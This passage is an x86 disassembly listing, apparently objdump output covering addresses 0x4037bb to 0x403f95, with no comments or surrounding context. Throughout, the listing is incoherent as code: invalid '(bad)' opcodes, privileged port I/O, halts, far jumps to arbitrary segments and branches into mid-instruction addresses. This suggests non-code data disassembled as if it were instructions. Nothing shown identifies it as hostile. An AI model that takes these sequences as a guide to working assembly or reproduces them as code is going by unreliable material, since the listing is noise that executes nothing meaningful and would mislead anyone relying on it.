  4037bb:	pop    ss
  4037bc:	adc    bh,ch
  4037be:	call   FWORD PTR [edi]
  4037c0:	bound  eax,QWORD PTR [eax-0x5f]
  4037c3:	sahf   
  4037c4:	ret    
  4037c5:	mov    bl,0x96
  4037c7:	xor    ecx,DWORD PTR [eax-0x1c]
  4037ca:	xchg   esi,eax
  4037cb:	ficomp DWORD PTR ds:0xf4691f6f
  4037d1:	pop    ebx
  4037d2:	xor    al,0x98
  4037d4:	cmp    al,0x8b
  4037d6:	push   0xffffff93
  4037d8:	and    ebp,ecx
  4037da:	imul   eax,DWORD PTR [eax],0xffffffac
  4037dd:	sbb    dh,BYTE PTR [ebx+0x58a42563]
  4037e3:	or     BYTE PTR [edx],bh
  4037e5:	aam    0x5a
  4037e7:	fsub   QWORD PTR [ebx*2-0x3749d939]
  4037ee:	retf   0xa065
  4037f1:	and    ah,BYTE PTR [edx+edx*1+0x66121778]
  4037f8:	xor    DWORD PTR [ecx-0x77055d09],ecx
  4037fe:	sub    ebx,esp
  403800:	and    BYTE PTR [ecx],dl
  403802:	and    BYTE PTR [ecx+0x35ecd23],bl
  403808:	cmp    eax,0xfd9489e9
  40380d:	les    ecx,FWORD PTR [edx+eiz*1]
  403810:	xor    al,0x18
  403812:	inc    ebx
  403813:	pop    ebp
  403814:	leave  
  403815:	pop    es
  403816:	std    
  403817:	cwde   
  403818:	mov    bh,0x81
  40381a:	push   ds
  40381b:	xor    BYTE PTR [ebx-0x19],0xdd
  40381f:	fwait
  403820:	pop    ecx
  403821:	xchg   esp,eax
  403822:	ds jb  0x403817
  403825:	in     eax,dx
  403826:	retf   
  403827:	mov    ds:0x4cb40f8d,eax
  40382c:	cmp    BYTE PTR [edi+ebp*4],ch
  40382f:	push   ebx
  403830:	dec    esp
  403831:	add    cl,ah
  403833:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403834:	fs daa 
  403836:	dec    esp
  403837:	hlt    
  403838:	inc    esp
  403839:	aam    0x6a
  40383b:	sub    BYTE PTR [esi+esi*1-0x64ee9f96],cl
  403842:	sub    al,BYTE PTR ss:[edi-0x7ee2b043]
  403849:	cmp    bh,dl
  40384b:	out    dx,eax
  40384c:	scas   al,BYTE PTR es:[edi]
  40384d:	push   cs
  40384e:	pop    ss
  40384f:	les    eax,FWORD PTR [edx+0x3e1779b1]
  403855:	mov    eax,0xb11bc2e4
  40385a:	(bad)  
  40385c:	popa   
  40385d:	sub    eax,0xc2c9898b
  403862:	not    BYTE PTR [ebx]
  403864:	fnstenv [edi]
  403866:	pop    ss
  403867:	ins    BYTE PTR es:[edi],dx
  403868:	popa   
  403869:	pop    ds
  40386a:	pop    ss
  40386b:	push   0x4
  40386d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40386e:	sub    eax,0x72d2fd1e
  403873:	popa   
  403874:	arpl   WORD PTR [esi+0x4e521904],ax
  40387a:	into   
  40387b:	into   
  40387c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40387d:	push   edi
  40387f:	jle    0x403888
  403881:	mov    al,0x20
  403883:	inc    eax
  403884:	bound  esi,QWORD PTR [ebx]
  403886:	icebp  
  403887:	jl     0x4038a3
  403889:	call   FWORD PTR [edx-0x2963e834]
  40388f:	test   al,0xf1
  403891:	ret    
  403892:	mov    esi,0x5282d4a8
  403897:	cmp    eax,0x7bc96aab
  40389c:	loop   0x40390a
  40389e:	inc    BYTE PTR [ebp+0x1bd2ee8f]
  4038a4:	sahf   
  4038a5:	repz pusha 
  4038a7:	stc    
  4038a8:	leave  
  4038a9:	xor    ecx,0x2e
  4038ac:	outs   dx,BYTE PTR ds:[esi]
  4038ad:	inc    ebp
  4038ae:	xor    al,0x10
  4038b0:	and    BYTE PTR [bx+si+0xf42],0xc0
  4038b6:	shl    ebp,0x41
  4038b9:	sub    esi,DWORD PTR [edi+0x7665ba8d]
  4038bf:	cmp    dh,BYTE PTR [ecx+eax*1-0x7bcef22f]
  4038c6:	inc    ebx
  4038c7:	mov    ebp,0xa1bc3cc
  4038cc:	pusha  
  4038cd:	lahf   
  4038ce:	or     al,0x66
  4038d0:	test   eax,0xc233e072
  4038d5:	ins    BYTE PTR es:[edi],dx
  4038d6:	frstor [ecx]
  4038d8:	scas   al,BYTE PTR es:[edi]
  4038d9:	mov    ds:0xc79c3104,al
  4038de:	inc    ebx
  4038df:	mov    sp,0x52ef
  4038e3:	mov    edi,0xc987d95
  4038e8:	daa    
  4038e9:	cmp    ecx,ebp
  4038eb:	std    
  4038ec:	pop    edi
  4038ed:	cdq    
  4038ee:	xor    edi,0x79
  4038f1:	lds    ebp,FWORD PTR [eax+0x53380388]
  4038f7:	fs mov esp,0xb68f5c55
  4038fd:	mov    bl,0x5f
  4038ff:	mov    eax,ds:0x98935a49
  403904:	or     BYTE PTR [ebx-0x48],al
  403907:	cdq    
  403908:	addr16 mov edx,0xbafcac37
  40390e:	add    DWORD PTR [esi],0x39
  403911:	into   
  403912:	push   edi
  403913:	sar    BYTE PTR [esi+0x18],1
  403916:	mov    al,0x6
  403918:	(bad)  
  403919:	call   0xa69b8602
  40391e:	sbb    edx,DWORD PTR [ebp+0x73]
  403921:	xor    BYTE PTR ds:0x9e4f0af8,ch
  403927:	ins    BYTE PTR es:[edi],dx
  403928:	cmp    ah,BYTE PTR [eax-0x3f]
  40392b:	bound  esi,QWORD PTR [esi+0x7c76833a]
  403931:	jmp    0x4038f6
  403933:	xor    esi,edx
  403935:	fdivr  st(6),st
  403937:	mov    cl,BYTE PTR [eax]
  403939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40393a:	dec    edx
  40393b:	and    BYTE PTR [edi+eax*8-0x3c],ah
  40393f:	test   al,0x1c
  403941:	mov    ds,WORD PTR [ebp+0x48]
  403944:	and    DWORD PTR [edi-0x6e],eax
  403947:	(bad)  
  403948:	fsub   st(3),st
  40394a:	addr16 cdq 
  40394c:	push   ebx
  40394d:	test   BYTE PTR [ebp+0x56],0xaa
  403951:	aam    0x81
  403953:	mov    ecx,0x9b4cf230
  403958:	out    dx,eax
  403959:	inc    edx
  40395a:	(bad)  
  40395b:	mov    ds:0xb9c6ad3d,eax
  403960:	addr16 pop es
  403962:	inc    edi
  403963:	dec    ecx
  403964:	in     al,dx
  403965:	mov    ebp,0xcf8845e
  40396a:	loop   0x403963
  40396c:	cld    
  40396d:	sub    eax,DWORD PTR [eax]
  40396f:	(bad)  
  403970:	test   DWORD PTR [eax-0x1e260a1e],0x85fc9f7c
  40397a:	fwait
  40397b:	mov    ds:0x1467d09d,al
  403980:	xor    BYTE PTR [edx+0x2a],bl
  403983:	aam    0x3c
  403985:	mov    ebp,0xdafa3093
  40398a:	or     eax,0xfa0aca3c
  40398f:	jbe    0x403920
  403991:	outs   dx,BYTE PTR ds:[esi]
  403992:	(bad)  
  403993:	pop    edx
  403994:	sbb    edi,DWORD PTR es:[ebx+0x20]
  403998:	jmp    0x40393e
  40399a:	xor    DWORD PTR ds:0x41df139a,esp
  4039a0:	in     al,dx
  4039a1:	imul   eax,DWORD PTR [edi+0x66],0x14
  4039a5:	adc    ah,0x21
  4039a8:	call   0xd8d924cd
  4039ad:	fwait
  4039ae:	mov    WORD PTR [eax],cs
  4039b0:	test   al,0x73
  4039b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039b3:	jno    0x4039fa
  4039b5:	mov    eax,ds:0x5f887aa4
  4039ba:	fs xchg esi,eax
  4039bc:	shr    cl,0xea
  4039bf:	cs das 
  4039c1:	shl    DWORD PTR [ecx],1
  4039c3:	jno    0x4039bb
  4039c5:	ds push edi
  4039c7:	xor    DWORD PTR [ecx],esp
  4039c9:	test   BYTE PTR [eax],0xc9
  4039cc:	int3   
  4039cd:	jne    0x4039f8
  4039cf:	jnp    0x403995
  4039d1:	aad    0x4a
  4039d3:	dec    ebx
  4039d4:	and    al,0xc3
  4039d6:	cwde   
  4039d7:	pop    ebp
  4039d8:	call   0x41e17f91
  4039dd:	pop    ebp
  4039de:	and    BYTE PTR [ebx-0x43ab2dfe],dl
  4039e4:	inc    eax
  4039e5:	push   eax
  4039e6:	mov    edx,DWORD PTR [esi-0x3e]
  4039e9:	test   DWORD PTR [ecx-0x5],esi
  4039ec:	scas   al,BYTE PTR es:[edi]
  4039ed:	mov    al,cl
  4039ef:	mov    WORD PTR [ebx-0x22],ds
  4039f2:	pop    esi
  4039f3:	jg     0x403a1b
  4039f5:	jmp    0x403a56
  4039f7:	fist   DWORD PTR ds:0x6783297a
  4039fd:	les    eax,FWORD PTR es:[ecx+0x4543616c]
  403a04:	mov    edi,0xec112cf6
  403a09:	mov    cl,0xc3
  403a0b:	adc    eax,0x3b4bb8d4
  403a10:	loop   0x4039e7
  403a12:	mov    edi,0x3dc4ef17
  403a17:	test   al,0x86
  403a19:	dec    eax
  403a1a:	in     eax,dx
  403a1b:	pop    edx
  403a1c:	gs test al,0x31
  403a1f:	enter  0x43b0,0x2b
  403a23:	leave  
  403a24:	aas    
  403a25:	sar    DWORD PTR [edx],1
  403a27:	xchg   edi,eax
  403a28:	sub    eax,0x3ccf7f3e
  403a2d:	fild   QWORD PTR [ecx+0x1083e38c]
  403a33:	xchg   ecx,eax
  403a34:	data16 adc bh,BYTE PTR [esi+0x52e66d74]
  403a3b:	out    0x5b,eax
  403a3d:	loop   0x4039f6
  403a3f:	lahf   
  403a40:	sub    ebx,DWORD PTR [eax*8+0x2496ef00]
  403a47:	cli    
  403a48:	xchg   esp,eax
  403a49:	scas   eax,DWORD PTR es:[edi]
  403a4a:	lock lds ebp,FWORD PTR [eax]
  403a4d:	or     ebp,ebp
  403a4f:	dec    edi
  403a50:	fdivr  QWORD PTR [ecx-0x3e77ce13]
  403a56:	add    eax,0xffce779a
  403a5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a5c:	rcr    BYTE PTR [edi+eax*2],1
  403a5f:	mov    edx,DWORD PTR [esi+0x39]
  403a62:	push   edi
  403a63:	jnp    0x403a6c
  403a65:	xchg   ebp,eax
  403a66:	dec    ecx
  403a67:	dec    ebx
  403a68:	lods   eax,DWORD PTR ds:[esi]
  403a69:	pop    ds
  403a6a:	ret    0xa3e
  403a6d:	je     0x403aa9
  403a6f:	fsubr  st,st(2)
  403a71:	and    eax,0x97433002
  403a76:	or     al,0x42
  403a78:	repnz xor eax,0xed97b0bc
  403a7e:	push   eax
  403a7f:	fcmovbe st,st(6)
  403a81:	pop    edx
  403a82:	mov    al,0x67
  403a84:	add    eax,0x905fc7ba
  403a89:	enter  0x2b57,0xac
  403a8d:	cmp    eax,0xe2214ab2
  403a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a93:	sub    eax,0x8ff6780b
  403a98:	inc    ebx
  403a99:	mov    edi,0x327f5884
  403a9e:	pop    ss
  403a9f:	leave  
  403aa0:	push   esi
  403aa1:	cmp    eax,0x9e2e752e
  403aa6:	xor    ebx,ecx
  403aa8:	cld    
  403aa9:	sub    ebx,DWORD PTR [esi]
  403aab:	inc    esi
  403aac:	(bad)  
  403aad:	icebp  
  403aae:	push   ds
  403aaf:	ret    0x4466
  403ab2:	fidiv  DWORD PTR [edx+0x4a]
  403ab5:	div    DWORD PTR [ecx+0x878094f]
  403abb:	pop    ecx
  403abc:	out    dx,al
  403abd:	add    BYTE PTR [edx-0x7dab0e4c],0x4c
  403ac4:	or     DWORD PTR [eax+edi*1+0x4ad36d4e],edx
  403acb:	dec    esi
  403acc:	mov    BYTE PTR [edx-0x615ad208],cl
  403ad2:	call   0x27af:0xaced4b19
  403ad9:	mov    cl,0x9
  403adb:	dec    edx
  403adc:	mov    gs:0x4dedfcc1,al
  403ae2:	sub    bh,BYTE PTR [ebx+esi*2-0x7a]
  403ae6:	(bad)  
  403ae7:	out    dx,al
  403ae8:	ss aaa 
  403aea:	xchg   esp,eax
  403aeb:	jnp    0x403ab3
  403aed:	aas    
  403aee:	and    esp,esp
  403af0:	hlt    
  403af1:	cmp    eax,0x7d5aff39
  403af6:	lock xor eax,0xff1fdf3a
  403afc:	sbb    bh,ah
  403afe:	sub    al,0x55
  403b00:	push   ecx
  403b01:	pushf  
  403b02:	or     dh,dh
  403b04:	fisubr DWORD PTR [edx+0x42]
  403b07:	jae    0x403ae4
  403b09:	mov    ch,0xfb
  403b0b:	std    
  403b0c:	xchg   BYTE PTR [ebp+0x41],cl
  403b0f:	das    
  403b10:	pop    es
  403b11:	mov    ebx,0x25b2b8d9
  403b16:	pop    esp
  403b17:	and    bh,BYTE PTR [eax+0x36]
  403b1a:	imul   esi,DWORD PTR [esi],0x6a502652
  403b20:	arpl   WORD PTR [ebx+0xf3f7ddf],sp
  403b26:	jae    0x403aa8
  403b28:	pop    edx
  403b29:	loop   0x403b88
  403b2b:	sbb    eax,0x7feff48e
  403b30:	mov    WORD PTR [esi],ds
  403b32:	outs   dx,BYTE PTR ds:[esi]
  403b33:	jmp    0x403ba4
  403b35:	sub    eax,DWORD PTR [esi]
  403b37:	je     0x403ad4
  403b39:	mov    dh,0x55
  403b3b:	mov    bl,0xc3
  403b3d:	jg     0x403b06
  403b3f:	add    BYTE PTR [ebp-0x777a350b],dh
  403b45:	cli    
  403b46:	aam    0x28
  403b48:	(bad)  
  403b49:	loop   0x403ba4
  403b4b:	jp     0x403b28
  403b4d:	sbb    ecx,DWORD PTR [ecx-0x63a54ca2]
  403b53:	pop    es
  403b54:	outs   dx,BYTE PTR ds:[esi]
  403b55:	pop    eax
  403b56:	mov    al,ds:0xc7f976a0
  403b5b:	fcmovb st,st(4)
  403b5d:	xchg   DWORD PTR [ecx],edx
  403b5f:	and    al,0x50
  403b61:	mov    esp,0x27cfaebd
  403b66:	mov    ds:0x797827ec,al
  403b6b:	inc    edx
  403b6c:	fucomip st,st(1)
  403b6e:	push   ss
  403b6f:	adc    DWORD PTR [esi],eax
  403b71:	xor    ebx,DWORD PTR [esi-0x70835451]
  403b77:	aam    0x85
  403b79:	xchg   ebp,eax
  403b7a:	push   esp
  403b7b:	sub    dh,BYTE PTR [bp+di+0x74]
  403b7f:	inc    esp
  403b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b81:	sub    BYTE PTR [eax-0x1777d686],bl
  403b87:	xchg   edi,eax
  403b88:	pop    esp
  403b89:	inc    edi
  403b8a:	and    ebx,DWORD PTR [ecx+ebp*1+0xa]
  403b8e:	cmp    dh,BYTE PTR [ecx+esi*1]
  403b91:	dec    edx
  403b92:	sbb    DWORD PTR [esi+0x54191d27],ebx
  403b98:	dec    ecx
  403b99:	pop    edi
  403b9a:	xor    al,0xc8
  403b9c:	mov    eax,ds:0x4a3b2134
  403ba1:	pop    ebx
  403ba2:	das    
  403ba3:	repz and BYTE PTR [ebp+0x6fe029e6],bl
  403baa:	sub    DWORD PTR [ecx-0x5dc0d0bc],ebp
  403bb0:	adc    BYTE PTR [ebp+0x12],dl
  403bb3:	jae    0x403b97
  403bb5:	dec    ecx
  403bb6:	xchg   ebp,eax
  403bb7:	mov    dl,0xaf
  403bb9:	mov    ebx,0xe94a6e37
  403bbe:	popa   
  403bbf:	retf   
  403bc0:	add    BYTE PTR [ecx-0x54c5a273],bl
  403bc6:	clc    
  403bc7:	imul   eax,DWORD PTR [edx+0x676fc66],0x40d941b6
  403bd1:	or     cl,BYTE PTR [ebp-0x4c934ea3]
  403bd7:	mov    ecx,DWORD PTR [esi-0x2d3de8c6]
  403bdd:	inc    esp
  403bde:	ss sbb al,0xf5
  403be1:	mov    esp,0xffaee55a
  403be6:	sub    dl,0x77
  403be9:	jns    0x403c6a
  403beb:	lea    ebp,[ecx+0x37]
  403bee:	mov    bl,0xb8
  403bf0:	push   ds
  403bf1:	(bad)  
  403bf3:	jmp    0xedad:0x8ea90633
  403bfa:	dec    ebp
  403bfb:	mov    ebx,0xa1999c79
  403c00:	jmp    0xa9b8:0x75d904dd
  403c07:	inc    edi
  403c08:	(bad)  
  403c09:	sti    
  403c0a:	retf   0x420e
  403c0d:	loope  0x403c3e
  403c0f:	sbb    edi,eax
  403c11:	loop   0x403ba8
  403c13:	mov    ds,WORD PTR [esi]
  403c15:	pop    edx
  403c16:	(bad)  
  403c17:	xor    BYTE PTR [ebx],ah
  403c19:	jl     0x403bb8
  403c1b:	add    dl,dh
  403c1d:	and    dh,BYTE PTR [edi+0x12fc12ce]
  403c23:	xchg   esp,eax
  403c24:	gs pop edx
  403c26:	mov    ecx,0xa61e8fb6
  403c2b:	or     esp,edi
  403c2d:	in     al,dx
  403c2e:	sub    BYTE PTR ds:0x49b8ce1,bl
  403c34:	aam    0xd8
  403c36:	(bad)  
  403c37:	pop    di
  403c39:	mov    eax,0xd1865b69
  403c3e:	hlt    
  403c3f:	dec    ebx
  403c40:	outs   dx,DWORD PTR ds:[esi]
  403c41:	repz pop es
  403c43:	add    BYTE PTR [edi+0xf],bh
  403c46:	adc    DWORD PTR [esi],ebp
  403c48:	shl    DWORD PTR [esi],1
  403c4a:	stos   BYTE PTR es:[edi],al
  403c4b:	inc    edi
  403c4c:	out    0xe7,al
  403c4e:	mov    edi,DWORD PTR [edx-0x69]
  403c51:	scas   eax,DWORD PTR es:[edi]
  403c52:	mov    ecx,0x93e637dc
  403c57:	ins    BYTE PTR es:[edi],dx
  403c58:	(bad)  
  403c59:	xchg   ebp,eax
  403c5a:	inc    esp
  403c5b:	cmp    al,0x95
  403c5d:	stos   BYTE PTR es:[edi],al
  403c5e:	or     al,0xc
  403c60:	fwait
  403c61:	test   BYTE PTR [ebx],cl
  403c63:	cld    
  403c64:	not    DWORD PTR [edi+0x6c29b362]
  403c6a:	and    DWORD PTR [ecx+0x2e9d57f8],ebp
  403c70:	fdiv   st,st(1)
  403c72:	ja     0x403cea
  403c74:	(bad)  
  403c75:	dec    esp
  403c76:	jg     0x403ce2
  403c78:	dec    ebp
  403c79:	mov    bl,0x95
  403c7b:	into   
  403c7c:	push   ebp
  403c7d:	int3   
  403c7e:	xchg   esp,eax
  403c7f:	shr    ebx,0xa2
  403c82:	xor    dl,BYTE PTR [eax+0x1021aaaa]
  403c88:	jae    0x403c87
  403c8a:	in     eax,dx
  403c8b:	imul   eax,edx,0xffffffd6
  403c8e:	int    0x5a
  403c90:	in     al,0x61
  403c92:	and    edx,DWORD PTR [eax-0x4e]
  403c95:	jo     0x403c3f
  403c97:	inc    edx
  403c98:	les    esp,FWORD PTR [ebp+0x5e]
  403c9b:	idiv   DWORD PTR [ebx+0x61]
  403c9e:	pushf  
  403c9f:	int    0xa1
  403ca1:	sahf   
  403ca2:	bound  esi,QWORD PTR [eax-0x49055d5a]
  403ca8:	adc    al,BYTE PTR [edx]
  403caa:	pusha  
  403cab:	sbb    dl,0xe0
  403cae:	nop
  403caf:	out    dx,eax
  403cb0:	stos   DWORD PTR es:[edi],eax
  403cb1:	mov    bh,0x6e
  403cb3:	or     DWORD PTR [edi+ecx*1],ebp
  403cb6:	mov    DWORD PTR [eax+edx*1+0x26],0xba85c7ad
  403cbe:	inc    ebx
  403cbf:	sbb    ah,BYTE PTR [esi]
  403cc1:	pop    ebx
  403cc2:	fst    DWORD PTR [ecx+eax*8+0xe]
  403cc6:	fs mov esp,0xd4ecb133
  403ccc:	add    ch,BYTE PTR [ecx+edx*1+0x4f]
  403cd0:	rol    bh,cl
  403cd2:	pop    edx
  403cd3:	inc    esi
  403cd4:	aaa    
  403cd5:	mov    ds:0xd30c2688,al
  403cda:	mov    eax,0x65368cb
  403cdf:	sub    al,0x45
  403ce1:	or     ecx,DWORD PTR [esi]
  403ce3:	jne    0x403c78
  403ce5:	lahf   
  403ce6:	mov    ch,0xdd
  403ce8:	jo     0x403c9c
  403cea:	xchg   ebp,esi
  403cec:	xor    ecx,DWORD PTR [ecx+0x47]
  403cef:	scas   al,BYTE PTR es:[edi]
  403cf0:	out    0xc8,eax
  403cf2:	call   0x8120:0x1c171dde
  403cf9:	cwde   
  403cfa:	in     eax,0x99
  403cfc:	in     eax,dx
  403cfd:	or     edx,DWORD PTR [eax]
  403cff:	pop    ebp
  403d00:	push   edi
  403d01:	sub    BYTE PTR [edx-0x5],cl
  403d04:	mov    al,ch
  403d06:	(bad)  
  403d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d08:	and    DWORD PTR [eax-0x13e2b7b0],edx
  403d0e:	fdiv   st,st(5)
  403d10:	das    
  403d11:	xchg   ecx,eax
  403d12:	cmp    eax,0x55ed499b
  403d17:	ficomp DWORD PTR [ebx+0x60]
  403d1a:	addr16 das 
  403d1c:	dec    ebp
  403d1d:	add    WORD PTR [edx],sp
  403d20:	rol    dh,cl
  403d22:	(bad)  
  403d24:	lock aaa 
  403d26:	and    eax,0xf2cc6a6e
  403d2b:	pop    eax
  403d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d2d:	rcr    DWORD PTR [eax],cl
  403d2f:	gs cld 
  403d31:	outs   dx,BYTE PTR ds:[esi]
  403d32:	mov    ebp,0x44468997
  403d37:	dec    ebp
  403d38:	fild   DWORD PTR [edi+0x57]
  403d3b:	int    0xab
  403d3d:	mov    edx,0xca51bdba
  403d42:	bound  ecx,QWORD PTR [ecx+0x52]
  403d45:	in     eax,dx
  403d46:	add    al,0x5b
  403d48:	push   es
  403d49:	dec    esi
  403d4a:	pop    eax
  403d4b:	leave  
  403d4c:	or     esp,DWORD PTR [edx-0x4cedabb]
  403d52:	je     0x403d38
  403d54:	mov    edx,0xbf5d349
  403d59:	sub    al,0x4f
  403d5c:	jnp    0x403d4e
  403d5e:	xchg   ebx,eax
  403d5f:	aas    
  403d60:	imul   esp,DWORD PTR [ebx+0x6ace05d2],0x62c16104
  403d6a:	pop    DWORD PTR [eax-0x33203f17]
  403d70:	adc    BYTE PTR [esi],al
  403d72:	xor    esi,ebx
  403d74:	sbb    ebx,edi
  403d76:	mov    DWORD PTR ds:0xc51b880d,edi
  403d7c:	ins    DWORD PTR es:[edi],dx
  403d7d:	xchg   esp,eax
  403d7e:	in     al,0x85
  403d80:	aaa    
  403d81:	sub    ch,BYTE PTR [ebx]
  403d83:	mov    ebx,0x6227a4ff
  403d88:	xor    al,dl
  403d8a:	fndisi(8087 only) 
  403d8c:	inc    ebx
  403d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d8e:	mov    ecx,0x66400b99
  403d93:	mov    edx,0x4e085baa
  403d98:	out    dx,eax
  403d99:	xor    DWORD PTR [eax-0x60],esp
  403d9c:	adc    BYTE PTR [ebp+0x3ca1482],dl
  403da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403da3:	shr    BYTE PTR [esi-0x33],1
  403da6:	mov    edx,DWORD PTR [ebp+0x1c3cc7c9]
  403dac:	push   edi
  403dad:	call   DWORD PTR ds:0x7b0ca993
  403db3:	push   ss
  403db4:	jo     0x403dab
  403db6:	and    DWORD PTR [ecx+ebp*4],0xeaf9c6f4
  403dbd:	cmp    ch,BYTE PTR [edx+0x20]
  403dc0:	int    0x7
  403dc2:	loop   0x403dac
  403dc4:	ins    DWORD PTR es:[edi],dx
  403dc5:	mov    ebp,ebx
  403dc7:	fwait
  403dc8:	push   DWORD PTR [ecx+0x6a]
  403dcb:	test   BYTE PTR [ebp+0xb],dl
  403dce:	cmp    DWORD PTR [ebp-0x15],edx
  403dd1:	jns    0x403e22
  403dd3:	or     al,0x17
  403dd5:	leave  
  403dd6:	sbb    al,0xee
  403dd8:	adc    al,0x1a
  403dda:	test   eax,0xac1ed17
  403ddf:	sub    al,dh
  403de1:	xor    DWORD PTR ds:0x3e8e6e12,ebx
  403de7:	(bad)  
  403de9:	add    ecx,edx
  403deb:	jp     0x403dbd
  403ded:	xchg   BYTE PTR [ebx],ah
  403def:	adc    BYTE PTR [edx+0x6af4a81c],ah
  403df5:	dec    esp
  403df6:	jb     0x403d8f
  403df8:	mov    ecx,0x253895fc
  403dfd:	xor    BYTE PTR [esi+0x1ce3253],dh
  403e03:	lods   eax,DWORD PTR ds:[esi]
  403e04:	xchg   bh,cl
  403e06:	fisubr WORD PTR [edi+0x5d]
  403e09:	repz mov esi,0xc9cb60d8
  403e0f:	mov    ah,0x89
  403e11:	cmc    
  403e12:	leave  
  403e13:	stos   DWORD PTR es:[edi],eax
  403e14:	dec    edi
  403e15:	je     0x403e79
  403e17:	add    eax,DWORD PTR [ebp+0x46b7d914]
  403e1d:	jmp    esi
  403e1f:	mov    esp,0x7d3b7804
  403e24:	push   cs
  403e25:	ins    BYTE PTR es:[edi],dx
  403e26:	mov    bl,0x99
  403e28:	push   ebp
  403e29:	adc    edx,ebx
  403e2b:	push   ss
  403e2c:	imul   esp,esp,0xfffffffc
  403e2f:	das    
  403e30:	mov    al,ds:0xdd994770
  403e35:	sub    cl,BYTE PTR [eax]
  403e37:	pop    esi
  403e38:	adc    DWORD PTR [edi],edi
  403e3a:	or     al,BYTE PTR [eax+0x16]
  403e3d:	adc    al,0x7e
  403e3f:	std    
  403e40:	cmp    esp,DWORD PTR [ecx-0x2ebb3997]
  403e46:	gs mov ebx,0x500a12e5
  403e4c:	sub    al,cl
  403e4e:	dec    edi
  403e4f:	shl    ecx,1
  403e51:	ret    0x20
  403e54:	loop   0x403dee
  403e56:	addr16 dec edi
  403e58:	nop
  403e59:	mov    ds:0xf3dcc8fc,eax
  403e5e:	test   al,0xf7
  403e60:	cli    
  403e61:	dec    ebp
  403e62:	ror    bh,0x9a
  403e65:	add    BYTE PTR [eax+0x38],bl
  403e68:	fist   DWORD PTR [eax-0x5c]
  403e6b:	pop    edi
  403e6c:	dec    edx
  403e6d:	adc    DWORD PTR [ecx+ebp*4+0x49],eax
  403e71:	mov    ecx,0x8a41915c
  403e76:	shl    BYTE PTR [eax],cl
  403e78:	mov    esi,0xa9d18d57
  403e7d:	add    al,0xd8
  403e7f:	adc    al,0x3f
  403e81:	mov    edi,0xc88e17a0
  403e86:	rol    DWORD PTR [eax+0x48],1
  403e89:	(bad)  
  403e8b:	push   es
  403e8c:	daa    
  403e8d:	adc    edx,0x31
  403e90:	mov    esi,0x14e17eb0
  403e95:	dec    ebx
  403e96:	call   0xa72a:0x2baf928e
  403e9d:	ss in  al,0x6b
  403ea0:	scas   eax,DWORD PTR es:[edi]
  403ea1:	xor    eax,0x33440d20
  403ea6:	xchg   bh,ah
  403ea8:	push   edi
  403ea9:	mov    ds,WORD PTR [edx+ecx*2]
  403eac:	arpl   WORD PTR [esi],dx
  403eae:	mov    WORD PTR [esi+eax*8+0x3c],ss
  403eb2:	jecxz  0x403e69
  403eb4:	and    BYTE PTR [esi+esi*1-0x1ad91ba6],ch
  403ebb:	mov    bl,0xed
  403ebd:	sub    esi,esi
  403ebf:	xor    esp,edx
  403ec1:	jp     0x403f34
  403ec3:	jmp    0x44fb:0x742b11c0
  403eca:	mov    esp,0x20f677f6
  403ecf:	dec    eax
  403ed0:	xchg   ebx,ebp
  403ed2:	and    ebp,eax
  403ed4:	fsubrp st(6),st
  403ed6:	js     0x403e83
  403ed8:	jne    0x403eea
  403eda:	or     DWORD PTR [edx],0x6ca4397a
  403ee0:	cli    
  403ee1:	dec    esi
  403ee2:	dec    esi
  403ee3:	in     eax,dx
  403ee4:	retf   0x9715
  403ee7:	dec    edx
  403ee8:	(bad)  
  403eea:	jle    0x403eda
  403eec:	mov    al,ds:0xa2a9be93
  403ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ef2:	mov    bl,0x25
  403ef4:	rol    BYTE PTR [esi-0x5],cl
  403ef7:	sub    eax,0x2134969f
  403efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403efd:	es jmp 0x403f0b
  403f00:	cmp    cl,BYTE PTR [esi+0x3e3c3a55]
  403f06:	cdq    
  403f07:	cwde   
  403f08:	sbb    eax,0xe6940629
  403f0d:	call   0x88b7f8d5
  403f12:	fmul   QWORD PTR [ecx-0x3c]
  403f15:	inc    esi
  403f16:	push   edi
  403f17:	gs in  al,0xc7
  403f1a:	sahf   
  403f1b:	in     eax,0x18
  403f1d:	jecxz  0x403ed3
  403f1f:	pop    esi
  403f20:	imul   ecx,edi,0x51
  403f23:	jno    0x403f5a
  403f25:	cmp    eax,0x7c88c741
  403f2a:	cs mov ?,ebx
  403f2d:	addr16 mov ds:0x615c,al
  403f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f32:	bound  ebx,QWORD PTR [esi+0x2083cfdd]
  403f38:	jmp    0x2b32:0xc285573b
  403f3f:	cmc    
  403f40:	sbb    esi,DWORD PTR [edx+eiz*4]
  403f43:	lea    edi,[esi+0x5ce50bda]
  403f49:	pushf  
  403f4a:	cli    
  403f4b:	(bad)  
  403f4c:	int3   
  403f4d:	(bad)  
  403f4f:	sbb    ah,BYTE PTR [edi]
  403f51:	sub    al,0x53
  403f53:	mov    al,BYTE PTR [edi+0x54305f29]
  403f59:	mov    ah,0x52
  403f5b:	jno    0x403edf
  403f5d:	call   0xc523:0x3750cb02
  403f64:	or     ebp,esi
  403f66:	mov    ds:0x8da62ae6,al
  403f6b:	aam    0xba
  403f6d:	lock cld 
  403f6f:	test   BYTE PTR [edi+0x9e82ca3],ch
  403f75:	fisubr DWORD PTR [ebp+edi*1+0x7f]
  403f79:	and    al,0x32
  403f7b:	jae    0x403f40
  403f7d:	or     ebp,esi
  403f7f:	xchg   ecx,eax
  403f80:	mov    ds:0x4c8979df,al
  403f85:	aam    0x3d
  403f87:	pushf  
  403f88:	push   eax
  403f89:	lods   al,BYTE PTR ds:[esi]
  403f8a:	nop
  403f8b:	mov    al,ds:0x50b20505
  403f90:	gs cwde 
  403f92:	pop    eax
  403f93:	jmp    0x403f5a
  403f95:	inc    ebp
